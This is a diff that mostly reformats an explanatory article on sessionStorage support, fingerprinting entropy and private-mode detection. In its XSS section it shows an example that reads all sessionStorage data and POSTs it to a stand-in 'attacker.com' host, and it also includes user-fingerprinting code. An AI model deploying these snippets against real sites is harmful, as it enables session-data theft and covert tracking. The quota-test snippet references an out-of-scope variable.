@@ -37,7 +37,7 @@ function detectSessionStorage() {
         sessionStorage.setItem(testKey, 'test');
         sessionStorage.removeItem(testKey);
         return true;
-      } catch(e) {
+      } catch (e) {
         return false;
       }
     })(),
@@ -46,10 +46,10 @@ function detectSessionStorage() {
       try {
         sessionStorage.setItem('test', 'test');
         return null;
-      } catch(e) {
+      } catch (e) {
         return e.name; // "SecurityError" or "QuotaExceededError"
       }
-    })()
+    })(),
   };
 }
 ```
@@ -62,15 +62,15 @@ Here's the reality: sessionStorage is supported everywhere. Like, 99.5%+ of brow
 
 ### Browser Compatibility Table
 
-| Browser | First Support Version | 2024 Support | Quota Limit | Private Mode Behavior |
-|---------|----------------------|--------------|-------------|------------------------|
-| Chrome | v4 (2010) | Full support | ~5MB per origin | Works normally, cleared on tab close |
-| Firefox | v2 (2009) | Full support | ~5MB per origin | Works, cleared on tab close |
-| Safari | v4 (2009) | Full support | ~5MB per origin | Works, cleared on tab close |
-| Edge | v12 (2015) | Full support | ~5MB per origin | Works normally, cleared on tab close |
-| Opera | v10.5 (2010) | Full support | ~5MB per origin | Works normally, cleared on tab close |
-| Mobile Safari | iOS 3.2 (2010) | Full support | 2.5MB | Works, cleared on tab close |
-| Chrome Android | All versions | Full support | ~5MB per origin | Works, cleared on tab close |
+| Browser        | First Support Version | 2024 Support | Quota Limit     | Private Mode Behavior                |
+| -------------- | --------------------- | ------------ | --------------- | ------------------------------------ |
+| Chrome         | v4 (2010)             | Full support | ~5MB per origin | Works normally, cleared on tab close |
+| Firefox        | v2 (2009)             | Full support | ~5MB per origin | Works, cleared on tab close          |
+| Safari         | v4 (2009)             | Full support | ~5MB per origin | Works, cleared on tab close          |
+| Edge           | v12 (2015)            | Full support | ~5MB per origin | Works normally, cleared on tab close |
+| Opera          | v10.5 (2010)          | Full support | ~5MB per origin | Works normally, cleared on tab close |
+| Mobile Safari  | iOS 3.2 (2010)        | Full support | 2.5MB           | Works, cleared on tab close          |
+| Chrome Android | All versions          | Full support | ~5MB per origin | Works, cleared on tab close          |
 
 Source: MDN Web Docs, Can I Use (2024), browser testing
 
@@ -117,16 +117,19 @@ The mobile Safari difference is interesting. It's one of the few ways to detect 
 Let's do the math. Entropy measures uniqueness. For sessionStorage:
 
 **Existence check**:
+
 - Supported: 99.5% of browsers
 - Not supported: 0.5% (ancient browsers, accessibility tools)
 - Entropy: -log2(0.995) = **0.007 bits** (basically nothing)
 
 **Access check** (can you actually write to it):
+
 - Accessible: 99% of browsers
 - Blocked: 1% (extreme privacy settings, corporate policies)
 - Entropy: -log2(0.99) = **0.014 bits** (still nothing)
 
 **Combined with error types**:
+
 - No error: 99%
 - SecurityError: 0.5%
 - QuotaExceededError (immediately): 0.5%
@@ -155,7 +158,7 @@ function sessionStorageFingerprint() {
     removable: false,
     quotaError: false,
     securityError: false,
-    hasExistingData: false
+    hasExistingData: false,
   };
 
   if (data.supported) {
@@ -176,8 +179,7 @@ function sessionStorageFingerprint() {
 
       // Check if website has existing session data
       data.hasExistingData = sessionStorage.length > 0;
-
-    } catch(e) {
+    } catch (e) {
       if (e.name === 'SecurityError') data.securityError = true;
       if (e.name === 'QuotaExceededError') data.quotaError = true;
     }
@@ -193,22 +195,23 @@ The `hasExistingData` check is sneaky. If you have session data from a previous 
 
 People always mix these up. Here's the actual difference:
 
-| Feature | SessionStorage | LocalStorage | Cookies |
-|---------|----------------|--------------|---------|
-| **Lifespan** | Tab session only | Permanent (until cleared) | Configurable (default: permanent) |
-| **Shared across tabs** | No (isolated per tab) | Yes (same origin) | Yes (same domain) |
-| **Sent to server** | No | No | Yes (with every HTTP request) |
-| **Storage limit** | ~5MB | ~5-10MB | ~4KB per cookie |
-| **API** | Synchronous | Synchronous | Synchronous (via document.cookie) |
-| **Cleared by "Clear Browsing Data"** | No (unless "All time") | Yes | Yes |
-| **Works in Web Workers** | No | No | No (but can access via HTTP) |
-| **Privacy mode behavior** | Normal | Normal or limited | Normal or blocked |
+| Feature                              | SessionStorage         | LocalStorage              | Cookies                           |
+| ------------------------------------ | ---------------------- | ------------------------- | --------------------------------- |
+| **Lifespan**                         | Tab session only       | Permanent (until cleared) | Configurable (default: permanent) |
+| **Shared across tabs**               | No (isolated per tab)  | Yes (same origin)         | Yes (same domain)                 |
+| **Sent to server**                   | No                     | No                        | Yes (with every HTTP request)     |
+| **Storage limit**                    | ~5MB                   | ~5-10MB                   | ~4KB per cookie                   |
+| **API**                              | Synchronous            | Synchronous               | Synchronous (via document.cookie) |
+| **Cleared by "Clear Browsing Data"** | No (unless "All time") | Yes                       | Yes                               |
+| **Works in Web Workers**             | No                     | No                        | No (but can access via HTTP)      |
+| **Privacy mode behavior**            | Normal                 | Normal or limited         | Normal or blocked                 |
 
 SessionStorage is the least persistent, which makes it the "safest" for privacy. But that doesn't mean it's not used for tracking within a session.
 
 ## Real-World Use Cases: Legitimate vs Tracking
 
 **Legitimate uses**:
+
 - Saving form data while filling out multi-step forms
 - Storing temporary authentication tokens for a single session
 - Saving shopping cart state (that doesn't need to persist)
@@ -216,6 +219,7 @@ SessionStorage is the least persistent, which makes it the "safest" for privacy.
 - Keeping track of which modals you've closed during this visit
 
 **Tracking uses**:
+
 - Storing a session-specific fingerprint ID
 - Tracking which pages you've visited in this session
 - Storing behavioral data to send in a batch later
@@ -231,18 +235,21 @@ Here's the good news: sessionStorage behavior is basically the same in private/i
 ### Private Mode Behavior by Browser (2024-2025 Data)
 
 **Chrome Incognito**:
+
 - SessionStorage works identically to normal mode
 - Data is isolated between incognito windows
 - Cleared when you close the incognito window
 - Cannot detect incognito mode via sessionStorage alone
 
 **Firefox Private Browsing**:
+
 - SessionStorage works identically to normal mode
 - Data is isolated per private window
 - Cleared when you close the private window
 - Cannot detect private mode via sessionStorage
 
 **Safari Private Browsing**:
+
 - SessionStorage works identically to normal mode
 - Data is cleared when you close the private tab
 - No detectable difference in behavior
@@ -258,7 +265,7 @@ function detectPrivateMode() {
     localStorage: testLocalStorage(),
     sessionStorage: testSessionStorage(),
     indexedDB: testIndexedDB(),
-    cookies: testCookies()
+    cookies: testCookies(),
   };
 
   // If localStorage fails but sessionStorage works, might be private mode
@@ -287,11 +294,12 @@ for (let i = 0; i < sessionStorage.length; i++) {
 // Send to attacker's server
 fetch('https://attacker.com/steal', {
   method: 'POST',
-  body: JSON.stringify(sessionData)
+  body: JSON.stringify(sessionData),
 });
 ```
 
 This is why you should **never store sensitive data** in sessionStorage:
+
 - ❌ API keys
 - ❌ Authentication tokens
 - ❌ Personal information
@@ -343,7 +351,7 @@ Want to see how your browser handles sessionStorage? Paste this into your browse
     accessible: false,
     quota: 0,
     performance: 0,
-    isolation: false
+    isolation: false,
   };
 
   if (results.supported) {
@@ -352,7 +360,7 @@ Want to see how your browser handles sessionStorage? Paste this into your browse
       sessionStorage.setItem('test', 'value');
       sessionStorage.removeItem('test');
       results.accessible = true;
-    } catch(e) {
+    } catch (e) {
       results.accessible = false;
     }
 
@@ -361,11 +369,12 @@ Want to see how your browser handles sessionStorage? Paste this into your browse
       try {
         const testString = 'x'.repeat(1024 * 100); // 100KB chunks
         let count = 0;
-        while (count < 100) { // Max 10MB test
+        while (count < 100) {
+          // Max 10MB test
           sessionStorage.setItem(`quota_test_${count}`, testString);
           count++;
         }
-      } catch(e) {
+      } catch (e) {
         results.quota = count * 100; // Approximate KB
         // Clean up
         for (let i = 0; i < count; i++) {
@@ -392,6 +401,7 @@ Want to see how your browser handles sessionStorage? Paste this into your browse
 ```
 
 This will tell you:
+
 - If sessionStorage is supported
 - If you can actually use it
 - Approximately how much quota you have
